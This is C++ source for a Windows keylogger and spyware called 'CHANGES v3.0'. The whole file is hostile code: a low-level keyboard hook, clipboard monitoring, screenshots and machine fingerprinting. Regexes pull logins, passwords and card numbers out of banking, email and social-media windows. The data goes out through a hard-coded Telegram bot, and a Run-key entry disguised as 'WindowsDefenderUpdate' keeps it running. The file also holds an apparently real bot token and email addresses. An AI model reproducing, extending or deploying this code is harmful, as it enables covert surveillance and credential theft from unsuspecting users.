#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <regex>
#include <sstream>
#include <shlobj.h>
#include <tlhelp32.h>
#include <map>
#include <wincrypt.h>
#include <iphlpapi.h>
#include <iomanip>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "iphlpapi.lib")

// ⚠️ SECURITY WARNING: Replace with your NEW credentials!
// Your current token is COMPROMISED - revoke it in @BotFather immediately!
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";

// Email configuration - SIMPLIFIED (no SMTP for now, can add later)
const wchar_t* ZOHO_EMAIL_FROM = L"jesko200233@zohomail.com";
const wchar_t* ZOHO_EMAIL_PASSWORD = L""; // Leave empty - email disabled for now
const wchar_t* ZOHO_EMAIL_TO = L"josephogidiagba49@gmail.com";

std::wstring keyBuffer, clipBuffer;
std::vector<BYTE> screenshotBuffer;
CRITICAL_SECTION keyLock, clipLock, contextLock;
HANDLE hHttpSession = NULL;
HHOOK keyboardHook = NULL;
bool running = true;
FILETIME lastScreenshot = {0};
std::wstring activeWindowTitle;
std::map<std::wstring, std::wstring> credentialCache;

// System Identification
std::wstring systemID;
std::wstring computerName;
std::wstring userName;
std::wstring macAddress;
std::wstring windowsVersion;

// ==================== TELEGRAM FUNCTIONS ====================
std::string url_encode(const std::string& input) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;
    
    for (unsigned char c : input) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        } else if (c == ' ') {
            escaped << '+';
        } else {
            escaped << '%' << std::setw(2) << static_cast<int>(c);
        }
    }
    return escaped.str();
}

std::string wstring_to_utf8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &strTo[0], size_needed, NULL, NULL);
    strTo.pop_back();
    return strTo;
}

bool init_winhttp() {
    hHttpSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
                              WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    return hHttpSession != NULL;
}

void send_telegram(const std::wstring& message) {
    if (!hHttpSession || message.empty()) return;
    
    std::string utf8_msg = wstring_to_utf8(message);
    if (utf8_msg.size() > 3900) {
        utf8_msg = utf8_msg.substr(0, 3900) + "...";
    }
    
    std::string encoded_msg = url_encode(utf8_msg);
    std::string path = "/bot" + wstring_to_utf8(std::wstring(BOT_TOKEN)) +
                      "/sendMessage?chat_id=" + wstring_to_utf8(std::wstring(CHAT_ID)) +
                      "&text=" + encoded_msg;
    std::wstring wpath(path.begin(), path.end());
    
    HINTERNET hConnect = WinHttpConnect(hHttpSession, L"api.telegram.org", 
                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) return;
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wpath.c_str(), NULL,
                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                           WINHTTP_FLAG_SECURE);
    if (hRequest) {
        WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        WinHttpReceiveResponse(hRequest, NULL);
        
        DWORD status = 0;
        DWORD size = sizeof(status);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                           NULL, &status, &size, NULL);
        
        WinHttpCloseHandle(hRequest);
    }
    WinHttpCloseHandle(hConnect);
    Sleep(200);
}

// ==================== SYSTEM IDENTIFICATION ====================
std::wstring GetSystemIdentifier() {
    std::wstring id;
    
    // Get Computer Name
    wchar_t compName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(compName, &size);
    computerName = compName;
    
    // Get User Name
    wchar_t userNameBuffer[UNLEN + 1];
    DWORD userNameSize = UNLEN + 1;
    GetUserNameW(userNameBuffer, &userNameSize);
    userName = userNameBuffer;
    
    // Get MAC Address
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD dwBufLen = sizeof(adapterInfo);
    if (GetAdaptersInfo(adapterInfo, &dwBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapterInfo = adapterInfo;
        if (pAdapterInfo) {
            wchar_t mac[18];
            swprintf_s(mac, L"%02X-%02X-%02X-%02X-%02X-%02X",
                      pAdapterInfo->Address[0], pAdapterInfo->Address[1],
                      pAdapterInfo->Address[2], pAdapterInfo->Address[3],
                      pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
            macAddress = mac;
        } else {
            macAddress = L"00-00-00-00-00-00";
        }
    } else {
        macAddress = L"00-00-00-00-00-00";
    }
    
    // Get Windows Version
    OSVERSIONINFOEXW osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXW));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
    GetVersionExW((LPOSVERSIONINFOW)&osvi);
    windowsVersion = std::to_wstring(osvi.dwMajorVersion) + L"." + 
                    std::to_wstring(osvi.dwMinorVersion) + L" Build " +
                    std::to_wstring(osvi.dwBuildNumber);
    
    // Create unique system ID
    id = computerName + L"_" + macAddress.substr(0, 8);
    return id;
}

// ==================== DUAL DELIVERY SYSTEM ====================
void deliver_report(const std::wstring& message, bool isSensitive = false) {
    // Add system identifier to all messages
    std::wstring enhancedMessage = L"🖥️ [" + systemID + L"]\n" + 
                                   L"👤 " + userName + L" @ " + computerName + L"\n" +
                                   L"🔗 " + macAddress + L"\n" +
                                   L"🪟 Windows " + windowsVersion + L"\n\n" +
                                   message;
    
    // Send to Telegram
    send_telegram(enhancedMessage);
}

// ==================== SMART CONTEXT DETECTOR ====================
class ContextAwareDetector {
private:
    std::wstring detect_email(const std::wstring& text) {
        std::wregex email_regex(L"([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,})");
        std::wsmatch match;
        if (std::regex_search(text, match, email_regex)) {
            return match[1].str();
        }
        
        std::wregex user_regex(L"([a-zA-Z0-9._]{6,25})(?=[\\r\\n\\t ]|$)");
        if (std::regex_search(text, match, user_regex)) {
            std::wstring user = match[1].str();
            if (currentContext == L"GMAIL" || wcsstr(activeWindowTitle.c_str(), L"mail")) {
                return user + L"@gmail.com";
            } else if (currentContext == L"OUTLOOK" || wcsstr(activeWindowTitle.c_str(), L"outlook")) {
                return user + L"@outlook.com";
            }
            return user;
        }
        return L"";
    }
    
    std::wstring detect_password(const std::wstring& text) {
        std::wregex pass_regex(L"([a-zA-Z0-9!@#$%^&*._-]{8,})(?=[\\r\\n\\t ]|$)");
        std::wsmatch match;
        if (std::regex_search(text, match, pass_regex)) {
            std::wstring pass = match[1].str();
            
            if (pass.find(L"password") != std::wstring::npos || 
                pass.find(L"qwerty") != std::wstring::npos ||
                pass.find(L"123456") != std::wstring::npos) {
                std::wstring masked(pass.length(), L'*');
                return masked + L"(" + std::to_wstring(pass.length()) + L")";
            }
        }
        return L"";
    }
    
    std::wstring detect_credit_card(const std::wstring& text) {
        std::wregex cc_regex(L"(\\d{4}[ -]?\\d{4}[ -]?\\d{4}[ -]?\\d{4})");
        std::wsmatch match;
        if (std::regex_search(text, match, cc_regex)) {
            std::wstring cc = match[1].str();
            if (cc.length() >= 16) {
                return L"****-****-****-" + cc.substr(cc.length() - 4);
            }
        }
        return L"";
    }
    
    std::wstring detect_phone(const std::wstring& text) {
        std::wregex phone_regex(L"(\\+?\\d{1,3}[ -]?\\(?\\d{3}\\)?[ -]?\\d{3}[ -]?\\d{4})");
        std::wsmatch match;
        if (std::regex_search(text, match, phone_regex)) {
            return match[1].str();
        }
        return L"";
    }
    
public:
    std::wstring currentContext;
    
    void update_context() {
        HWND foreground = GetForegroundWindow();
        if (foreground) {
            wchar_t title[256] = {0};
            GetWindowTextW(foreground, title, 256);
            EnterCriticalSection(&contextLock);
            activeWindowTitle = title;
            
            std::wstring title_lower = title;
            std::transform(title_lower.begin(), title_lower.end(), title_lower.begin(), ::towlower);
            
            if (title_lower.find(L"gmail") != std::wstring::npos || 
                title_lower.find(L"google") != std::wstring::npos) {
                currentContext = L"GMAIL";
            } else if (title_lower.find(L"outlook") != std::wstring::npos || 
                       title_lower.find(L"live.com") != std::wstring::npos ||
                       title_lower.find(L"hotmail") != std::wstring::npos) {
                currentContext = L"OUTLOOK";
            } else if (title_lower.find(L"facebook") != std::wstring::npos || 
                       title_lower.find(L"login") != std::wstring::npos) {
                currentContext = L"FACEBOOK";
            } else if (title_lower.find(L"bank") != std::wstring::npos || 
                       title_lower.find(L"chase") != std::wstring::npos || 
                       title_lower.find(L"wells") != std::wstring::npos ||
                       title_lower.find(L"paypal") != std::wstring::npos) {
                currentContext = L"BANK";
            } else if (title_lower.find(L"amazon") != std::wstring::npos || 
                       title_lower.find(L"ebay") != std::wstring::npos) {
                currentContext = L"SHOPPING";
            } else {
                currentContext = L"GENERAL";
            }
            LeaveCriticalSection(&contextLock);
        }
    }
    
    std::wstring detect_sensitive_data(const std::wstring& text) {
        update_context();
        
        std::wstring email = detect_email(text);
        std::wstring pass = detect_password(text);
        std::wstring cc = detect_credit_card(text);
        std::wstring phone = detect_phone(text);
        
        std::wstring result;
        
        if (!email.empty() && !pass.empty()) {
            std::wstring key = email + L"_" + currentContext;
            if (credentialCache.find(key) == credentialCache.end()) {
                result = L"🔐 [" + currentContext + L" CREDENTIALS]\n";
                result += L"📧 Login: " + email + L"\n";
                result += L"🔑 Password: " + pass + L"\n";
                result += L"💻 Window: " + activeWindowTitle;
                credentialCache[key] = pass;
            }
        } else if (!email.empty()) {
            result = L"📧 [" + currentContext + L"]: " + email;
        } else if (!pass.empty()) {
            result = L"🔑 [" + currentContext + L" PASSWORD]: " + pass;
        } else if (!cc.empty()) {
            result = L"💳 [CREDIT CARD]: " + cc + L"\n💻 Window: " + activeWindowTitle;
        } else if (!phone.empty()) {
            result = L"📞 [PHONE]: " + phone + L"\n💻 Window: " + activeWindowTitle;
        }
        
        return result;
    }
    
    std::wstring get_context_summary() {
        return L"[" + currentContext + L"] " + activeWindowTitle;
    }
};

ContextAwareDetector detector;

// ==================== KEYBOARD HOOK ====================
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            BYTE keyboardState[256] = {0};
            GetKeyboardState(keyboardState);
            
            WCHAR buffer[16] = {0};
            int result = ToUnicode(kbdStruct->vkCode, 
                                 MapVirtualKey(kbdStruct->vkCode, MAPVK_VK_TO_VSC),
                                 keyboardState, buffer, 16, 0);
            
            if (result > 0) {
                EnterCriticalSection(&keyLock);
                keyBuffer += buffer;
                
                if (keyBuffer.length() > 200) {
                    keyBuffer = keyBuffer.substr(keyBuffer.length() - 100);
                }
                LeaveCriticalSection(&keyLock);
            } else {
                EnterCriticalSection(&keyLock);
                switch (kbdStruct->vkCode) {
                    case VK_SPACE: keyBuffer += L" "; break;
                    case VK_RETURN: keyBuffer += L"\n"; break;
                    case VK_TAB: keyBuffer += L"\t"; break;
                    case VK_BACK: 
                        if (!keyBuffer.empty()) keyBuffer.pop_back();
                        break;
                    case VK_ESCAPE: keyBuffer += L"[ESC]"; break;
                    case VK_DELETE: keyBuffer += L"[DEL]"; break;
                }
                LeaveCriticalSection(&keyLock);
            }
            
            detector.update_context();
        }
    }
    
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

bool install_keyboard_hook() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 
                                   GetModuleHandle(NULL), 0);
    return keyboardHook != NULL;
}

// ==================== ENHANCED SCREENSHOT CAPTURE ====================
void capture_enhanced_screenshot() {
    // Higher quality - 70% of original size
    int width = GetSystemMetrics(SM_CXSCREEN) * 70 / 100;
    int height = GetSystemMetrics(SM_CYSCREEN) * 70 / 100;
    
    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) return;
    
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    if (!hdcMem) {
        ReleaseDC(NULL, hdcScreen);
        return;
    }
    
    // Create 32-bit bitmap for better quality
    BITMAPINFO bmi = {0};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height; // Top-down
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;
    
    void* pBits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, &pBits, NULL, 0);
    if (!hBitmap) {
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return;
    }
    
    SelectObject(hdcMem, hBitmap);
    
    // Use high-quality stretching
    SetStretchBltMode(hdcMem, COLORONCOLOR);
    
    // Capture
    StretchBlt(hdcMem, 0, 0, width, height, 
               hdcScreen, 0, 0, 
               GetSystemMetrics(SM_CXSCREEN), 
               GetSystemMetrics(SM_CYSCREEN), 
               SRCCOPY | CAPTUREBLT);
    
    // Add timestamp watermark
    SYSTEMTIME st;
    GetLocalTime(&st);
    wchar_t timestamp[64];
    swprintf_s(timestamp, 64, L"%02d:%02d:%02d", st.wHour, st.wMinute, st.wSecond);
    
    // Draw watermark
    SetBkMode(hdcMem, TRANSPARENT);
    SetTextColor(hdcMem, RGB(255, 0, 0)); // Red text
    
    // Draw timestamp
    if (systemID.length() > 0) {
        std::wstring watermark = std::wstring(timestamp) + L" - " + systemID;
        TextOutW(hdcMem, 10, height - 30, watermark.c_str(), watermark.length());
    } else {
        TextOutW(hdcMem, 10, height - 30, timestamp, wcslen(timestamp));
    }
    
    // Get bitmap data
    DWORD imageSize = ((width * 32 + 31) / 32) * 4 * height; // Correct calculation for 32-bit
    screenshotBuffer.resize(imageSize + 1024);
    
    if (GetDIBits(hdcMem, hBitmap, 0, height, screenshotBuffer.data(), &bmi, DIB_RGB_COLORS)) {
        // Add BMP header
        BITMAPFILEHEADER bf = {0};
        bf.bfType = 0x4D42;
        bf.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + imageSize;
        bf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        
        std::vector<BYTE> finalBuffer;
        finalBuffer.resize(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + imageSize);
        
        // Copy headers and data
        memcpy(finalBuffer.data(), &bf, sizeof(BITMAPFILEHEADER));
        memcpy(finalBuffer.data() + sizeof(BITMAPFILEHEADER), &bmi.bmiHeader, sizeof(BITMAPINFOHEADER));
        memcpy(finalBuffer.data() + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), 
               screenshotBuffer.data(), imageSize);
        
        screenshotBuffer = finalBuffer;
    }
    
    // Cleanup
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

// ==================== CLIPBOARD MONITOR ====================
std::wstring get_clipboard() {
    if (!IsClipboardFormatAvailable(CF_UNICODETEXT) || !OpenClipboard(NULL)) 
        return L"";
    
    std::wstring result;
    HGLOBAL hglb = GetClipboardData(CF_UNICODETEXT);
    if (hglb) {
        wchar_t* clipText = (wchar_t*)GlobalLock(hglb);
        if (clipText) {
            result = clipText;
            GlobalUnlock(hglb);
        }
    }
    CloseClipboard();
    return result;
}

void clipboard_monitor() {
    std::wstring lastClip;
    while (running) {
        std::wstring clip = get_clipboard();
        if (!clip.empty() && clip != lastClip && clip.length() > 3) {
            std::wstring sensitive = detector.detect_sensitive_data(clip);
            if (!sensitive.empty()) {
                deliver_report(L"📋 [CLIPBOARD - SENSITIVE]\n" + sensitive, true);
            } else if (clip.length() > 20 && clip.length() < 500) {
                std::wstring context = detector.get_context_summary();
                deliver_report(L"📋 [CLIPBOARD] " + context + L"\n" + 
                             clip.substr(0, 100) + 
                             (clip.length() > 100 ? L"..." : L""), false);
            }
            lastClip = clip;
        }
        Sleep(1800);
    }
}

// ==================== SCREENSHOT SENDING ====================
void send_screenshot() {
    if (screenshotBuffer.empty() || !hHttpSession) return;
    
    HINTERNET hConnect = WinHttpConnect(hHttpSession, L"api.telegram.org",
                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) return;
    
    std::string path = "/bot" + wstring_to_utf8(std::wstring(BOT_TOKEN)) +
                      "/sendPhoto?chat_id=" + wstring_to_utf8(std::wstring(CHAT_ID));
    std::wstring wpath(path.begin(), path.end());
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wpath.c_str(), NULL,
                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                           WINHTTP_FLAG_SECURE);
    if (hRequest) {
        std::string boundary = "----ChangesBoundary" + std::to_string(GetTickCount());
        std::wstring w_content_type = L"Content-Type: multipart/form-data; boundary=";
        w_content_type += std::wstring(boundary.begin(), boundary.end());
        
        std::string body = "--" + boundary + "\r\n" +
                          "Content-Disposition: form-data; name=\"photo\"; filename=\"screen_" + 
                          wstring_to_utf8(systemID) + ".bmp\"\r\n" +
                          "Content-Type: image/bmp\r\n\r\n";
        body.append(screenshotBuffer.begin(), screenshotBuffer.end());
        body += "\r\n--" + boundary + "--\r\n";
        
        if (WinHttpSendRequest(hRequest, w_content_type.c_str(), -1L,
                              (LPVOID)body.data(), (DWORD)body.length(), 
                              (DWORD)body.length(), 0)) {
            WinHttpReceiveResponse(hRequest, NULL);
        }
        WinHttpCloseHandle(hRequest);
    }
    WinHttpCloseHandle(hConnect);
    screenshotBuffer.clear();
}

// ==================== IDLE DETECTION ====================
DWORD GetIdleTimeSeconds() {
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(LASTINPUTINFO);
    if (GetLastInputInfo(&lii)) {
        return (GetTickCount() - lii.dwTime) / 1000;
    }
    return 0;
}

bool IsScreenLocked() {
    HDESK hDesk = OpenInputDesktop(0, FALSE, DESKTOP_SWITCHDESKTOP);
    if (hDesk == NULL) return true;
    CloseDesktop(hDesk);
    return false;
}

bool IsScreensaverActive() {
    BOOL bActive = FALSE;
    SystemParametersInfo(SPI_GETSCREENSAVERRUNNING, 0, &bActive, 0);
    return bActive != FALSE;
}

bool should_take_screenshot() {
    DWORD idleSeconds = GetIdleTimeSeconds();
    
    if (idleSeconds > 600) return false;
    if (IsScreenLocked()) return false;
    if (IsScreensaverActive()) return false;
    
    if (activeWindowTitle.empty() || activeWindowTitle == L"") {
        return false;
    }
    
    std::wstring lowerTitle = activeWindowTitle;
    std::transform(lowerTitle.begin(), lowerTitle.end(), lowerTitle.begin(), ::towlower);
    
    if (lowerTitle.find(L"task manager") != std::wstring::npos ||
        lowerTitle.find(L"start") != std::wstring::npos ||
        lowerTitle.find(L"notification") != std::wstring::npos) {
        return false;
    }
    
    static DWORD lastScreenshotTime = 0;
    DWORD currentTime = GetTickCount();
    
    if (idleSeconds < 60) {
        if (currentTime - lastScreenshotTime > 60000) {
            lastScreenshotTime = currentTime;
            return true;
        }
    } else if (idleSeconds < 300) {
        if (currentTime - lastScreenshotTime > 300000) {
            lastScreenshotTime = currentTime;
            return true;
        }
    } else {
        if (currentTime - lastScreenshotTime > 600000) {
            lastScreenshotTime = currentTime;
            return true;
        }
    }
    
    return false;
}

// ==================== PERSISTENCE & STEALTH ====================
void persistence() {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER,
                               L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                               0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        wchar_t path[MAX_PATH];
        if (GetModuleFileNameW(NULL, path, MAX_PATH) > 0) {
            RegSetValueExW(hKey, L"WindowsDefenderUpdate", 0, REG_SZ,
                          (BYTE*)path, (wcslen(path) + 1) * sizeof(wchar_t));
        }
        RegCloseKey(hKey);
    }
}

void stealth_init() {
    FreeConsole();
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
    
    HWND hWnd = GetConsoleWindow();
    if (hWnd) ShowWindow(hWnd, SW_HIDE);
}

// ==================== MODIFIED PROCESS_KEYS ====================
void process_keys() {
    if (!TryEnterCriticalSection(&keyLock)) return;
    if (keyBuffer.empty()) {
        LeaveCriticalSection(&keyLock);
        return;
    }
    
    std::wstring data = keyBuffer;
    keyBuffer.clear();
    LeaveCriticalSection(&keyLock);
    
    std::wstring sensitive = detector.detect_sensitive_data(data);
    if (!sensitive.empty()) {
        deliver_report(sensitive, true);
    } else if (data.length() > 15) {
        std::wstring summary = detector.get_context_summary();
        std::wstring message = summary + L"\n📝: " + data.substr(0, 150);
        if (data.length() > 150) message += L"...";
        deliver_report(message, false);
    }
}

// ==================== MAIN FUNCTION ====================
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    DisableThreadLibraryCalls(GetModuleHandle(NULL));
    CoInitialize(NULL);
    
    // Initialize system identification FIRST
    systemID = GetSystemIdentifier();
    
    InitializeCriticalSection(&keyLock);
    InitializeCriticalSection(&clipLock);
    InitializeCriticalSection(&contextLock);
    
    stealth_init();
    persistence();
    
    if (init_winhttp()) {
        // FIXED: Proper string concatenation
        std::wstring activationMsg = L"🚀 [CHANGES v3.0] ACTIVATED\n";
        activationMsg += L"🖥️ SYSTEM: " + systemID + L"\n";
        activationMsg += L"👤 USER: " + userName + L"\n";
        activationMsg += L"💻 COMPUTER: " + computerName + L"\n";
        activationMsg += L"🔗 MAC: " + macAddress + L"\n";
        activationMsg += L"🪟 OS: Windows " + windowsVersion + L"\n";
        activationMsg += L"📧 EMAIL: ";
        activationMsg += (wcslen(ZOHO_EMAIL_PASSWORD) > 0 ? L"ENABLED" : L"DISABLED");
        activationMsg += L"\n";
        activationMsg += L"📊 STATUS: ACTIVE AND MONITORING";
        
        deliver_report(activationMsg, true);
        
        if (!install_keyboard_hook()) {
            deliver_report(L"❌ Failed to install keyboard hook", true);
            return 1;
        }
        
        std::thread clipboard_thread(clipboard_monitor);
        clipboard_thread.detach();
        
        SYSTEMTIME st;
        DWORD lastKeyProcess = GetTickCount();
        DWORD lastActiveCheck = GetTickCount();
        bool wasActive = true;
        
        MSG msg;
        PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE);
        
        while (running) {
            if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            
            if (GetTickCount() - lastKeyProcess > 5000) {
                process_keys();
                lastKeyProcess = GetTickCount();
            }
            
            if (TryEnterCriticalSection(&clipLock)) {
                if (!clipBuffer.empty()) {
                    deliver_report(clipBuffer, false);
                    clipBuffer.clear();
                }
                LeaveCriticalSection(&clipLock);
            }
            
            if (GetTickCount() - lastActiveCheck > 30000) {
                DWORD idleSeconds = GetIdleTimeSeconds();
                bool isActive = (idleSeconds < 300);
                
                if (wasActive && !isActive) {
                    deliver_report(L"💤 [SYSTEM] Computer entering idle mode", false);
                } else if (!wasActive && isActive) {
                    deliver_report(L"⚡ [SYSTEM] Computer is now active", false);
                }
                wasActive = isActive;
                lastActiveCheck = GetTickCount();
            }
            
            GetSystemTime(&st);
            FILETIME now;
            SystemTimeToFileTime(&st, &now);
            ULARGE_INTEGER nowUL = {now.dwLowDateTime, now.dwHighDateTime};
            ULARGE_INTEGER lastUL = {lastScreenshot.dwLowDateTime, lastScreenshot.dwHighDateTime};
            
            if ((nowUL.QuadPart - lastUL.QuadPart) > 600000000LL) {
                if (should_take_screenshot()) {
                    capture_enhanced_screenshot();
                    send_screenshot();
                    deliver_report(L"📸 [ENHANCED SCREENSHOT] " + activeWindowTitle + 
                                 L" | Quality: High (70%)", false);
                    lastScreenshot = now;
                } else {
                    lastScreenshot = now;
                }
            }
            
            Sleep(100);
        }
        
        if (keyboardHook) {
            UnhookWindowsHookEx(keyboardHook);
        }
    }
    
    running = false;
    Sleep(1000);
    DeleteCriticalSection(&clipLock);
    DeleteCriticalSection(&keyLock);
    DeleteCriticalSection(&contextLock);
    if (hHttpSession) WinHttpCloseHandle(hHttpSession);
    CoUninitialize();
    return 0;
}
